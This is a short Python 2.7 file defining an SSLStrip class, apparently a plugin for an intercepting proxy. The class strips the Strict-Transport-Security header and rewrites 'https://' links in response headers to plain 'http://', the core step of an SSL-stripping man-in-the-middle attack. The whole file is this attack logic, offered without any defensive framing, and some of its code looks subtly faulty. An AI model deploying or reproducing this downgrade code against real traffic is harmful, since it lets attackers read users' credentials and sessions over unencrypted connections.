#!/usr/bin/python2.7 
 
from __future__ import print_function

class SSLStrip:
    def modify_request(self, header, body):
        pass
    def modify_response(self, req, headers, body):
        if headers:
            hsts = 'Strict-Transport-Security'
            del headers[hsts]
            for h in headers:
                if "https://" in headers[h]:
                    headers[h] = headers[h].replace("https://","http://s")
                    print("stripped: ", headers[h], headers[h].replace("https://","http://s"))